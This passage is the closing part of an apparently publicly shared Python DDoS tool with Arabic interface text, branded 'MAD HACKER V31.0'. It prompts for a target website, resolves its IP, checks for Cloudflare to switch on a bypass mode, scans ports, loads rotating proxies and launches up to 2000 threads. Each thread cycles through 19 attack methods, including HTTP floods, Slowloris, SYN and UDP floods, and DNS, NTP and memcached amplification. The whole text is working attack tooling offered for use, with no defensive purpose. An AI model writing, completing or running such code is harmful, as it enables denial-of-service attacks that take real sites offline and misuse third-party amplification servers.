├─14. NTP Amp         : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['ntp_amp']:,} req)
├─15. Memcached Amp   : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['memcached_amp']:,} req)
├─16. SSDP Amp        : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['ssdp_amp']:,} req)
├─17. CharGEN Amp     : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['chargen_amp']:,} req)
├─18. SNMP Amp        : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['snmp_amp']:,} req)
└─19. TFTP Amp        : {C.GREEN}● نشط{C.END}   ({ATTACK_METHODS_STATS['tftp_amp']:,} req)""")

# ==================== 8. عامل الهجوم الرئيسي ====================
def attack_worker(layer7, network, amp):
    """عامل الهجوم"""
    global active_threads
    
    with thread_lock:
        active_threads += 1
    
    methods = [
        layer7.http_flood,
        layer7.https_flood,
        layer7.post_flood,
        layer7.range_flood,
        layer7.slowloris,
        layer7.rudy_attack,
        layer7.multipart_post,
        layer7.cookie_flood,
        layer7.ssl_attack,
        network.tcp_syn_flood,
        network.udp_flood,
        network.icmp_flood,
        amp.dns_amplification,
        amp.ntp_amplification,
        amp.memcached_amplification,
        amp.ssdp_amplification,
        amp.chargen_amplification,
        amp.snmp_amplification,
        amp.tftp_amplification
    ]
    
    while True:
        try:
            method = random.choice(methods)
            method()
            time.sleep(random.uniform(0.01, 0.05))
        except:
            pass
    
    with thread_lock:
        active_threads -= 1

# ==================== 9. الدالة الرئيسية ====================
def main():
    global TARGET_URL, TARGET_HOST, TARGET_IP, OPEN_PORTS, WORKING_PROXIES
    global CLOUDFLARE_DETECTED, active_threads, stats
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{C.RED}{C.BOLD}╔══════════════════════════════════════════════════════════════════════════╗
║              MAD HACKER V31.0 - ULTIMATE DDoS PRO                         ║
║                    أقوى أداة DDoS - 19 طريقة هجوم                         ║
╠══════════════════════════════════════════════════════════════════════════╣
║  {C.GREEN}[+] المطور: @SY_Z4 | @SY_Z4{C.RED}                                              ║
║  {C.GREEN}[+] تقنيات: HTTP Flood | Slowloris | DNS Amp | TCP SYN | 19 طريقة{C.RED}          ║
║  {C.GREEN}[+] الحماية: تجاوز Cloudflare | تدوير بروكسيات | 19 طريقة هجوم{C.RED}              ║
╚══════════════════════════════════════════════════════════════════════════╝{C.END}
    """)
    
    url = input(f"{C.GREEN}ENTE wbsite LINK:{C.END}").strip()
    if not url:
        print(f"{C.RED}[✗] يجب إدخال رابط!{C.END}")
        return
    
    TARGET_URL = url
    
    # استخراج الهوست
    if url.startswith("https://"):
        TARGET_HOST = url.replace("https://", "").split("/")[0]
    elif url.startswith("http://"):
        TARGET_HOST = url.replace("http://", "").split("/")[0]
    else:
        TARGET_HOST = url.split("/")[0]
    
    # الحصول على IP
    try:
        TARGET_IP = socket.gethostbyname(TARGET_HOST)
        print(f"{C.GREEN}[✓] الـ IP: {TARGET_IP}{C.END}")
    except:
        print(f"{C.RED}[✗] فشل الحصول على IP{C.END}")
        return
    
    # كشف Cloudflare
    print(f"{C.CYAN}[*] جاري فحص الحماية...{C.END}")
    try:
        r = requests.get(url, timeout=5, verify=False)
        if 'cf-ray' in r.headers or 'cloudflare' in r.text.lower():
            CLOUDFLARE_DETECTED = True
            print(f"{C.YELLOW}[!] الموقع محمي بـ Cloudflare - تفعيل وضع التجاوز{C.END}")
        else:
            print(f"{C.GREEN}[✓] الموقع غير محمي بـ Cloudflare{C.END}")
    except:
        print(f"{C.YELLOW}[!] لا يمكن تحديد الحماية، سيتم استخدام وضع التجاوز{C.END}")
        CLOUDFLARE_DETECTED = True
    
    # فحص البورتات
    print(f"{C.CYAN}[*] جاري فحص البورتات...{C.END}")
    OPEN_PORTS = scan_ports()
    print(f"{C.GREEN}[✓] تم العثور على {len(OPEN_PORTS)} بورت مفتوح{C.END}")
    
    # تحميل البروكسيات
    use_proxy = input(f"{C.YELLOW}[?] استخدام بروكسيات؟ (y/n) [y]: {C.END}").lower()
    if use_proxy != 'n':
        print(f"{C.CYAN}[*] جاري تحميل البروكسيات...{C.END}")
        WORKING_PROXIES = load_proxies()
        print(f"{C.GREEN}[✓] تم تحميل {len(WORKING_PROXIES)} بروكسي{C.END}")
    else:
        WORKING_PROXIES = []
        print(f"{C.YELLOW}[!] جاري بدون بروكسيات{C.END}")
    
    # قوة الهجوم
    try:
        intensity = int(input(f"{C.YELLOW}[?] قوة الهجوم (1-2000) [500]: {C.END}") or "500")
        intensity = max(1, min(2000, intensity))
    except:
        intensity = 500
    
    print(f"{C.GREEN}[✓] بدء الهجوم بقوة {intensity}{C.END}")
    print(f"{C.RED}[!] اضغط Ctrl+C للإيقاف{C.END}")
    print(f"{C.CYAN}{'='*70}{C.END}")
    time.sleep(2)
    
    stats['start_time'] = time.time()
    
    # تهيئة الهجمات
    layer7 = Layer7Attacks(TARGET_URL, TARGET_HOST)
    network = NetworkAttacks(TARGET_IP)
    amp = AdvancedAmplificationAttacks(TARGET_IP)
    
    # بدء الهجوم
    with ThreadPoolExecutor(max_workers=intensity) as executor:
        futures = [executor.submit(attack_worker, layer7, network, amp) for _ in range(intensity)]
        
        try:
            while True:
                show_stats()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{C.YELLOW}[!] تم إيقاف الهجوم{C.END}")
            
            elapsed = time.time() - stats['start_time']
            print(f"\n{C.GREEN}┌─[ النتائج النهائية ]{C.END}")
            print(f"├─ ✅ ناجحة    : {stats['success']:,}")
            print(f"├─ ⚠️  قد سقط  : {stats['maybe_down']:,}")
            print(f"├─ ❌ فاشلة    : {stats['failed']:,}")
            print(f"├─ 📊 إجمالي   : {stats['total']:,}")
            print(f"├─ ⚡ السرعة   : {stats['total']/elapsed:.1f}/ث")
            print(f"├─ 📈 النجاح   : {stats['success']/stats['total']*100:.1f}%")
            print(f"├─ ⏱️  الوقت   : {int(elapsed//3600):02d}:{int((elapsed%3600)//60):02d}:{int(elapsed%60):02d}")
            print(f"├─ 🌐 باندويث  : {stats['bandwidth']/1024/1024:.2f} MB")
            print(f"└─ 🔗 اتصالات  : {stats['connections']:,}")

# ==================== تشغيل البرنامج ====================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[!] تم إيقاف البرنامج{C.END}")
    except Exception as e:
        print(f"{C.RED}[✗] خطأ: {e}{C.END}")
        import traceback
        traceback.print_exc()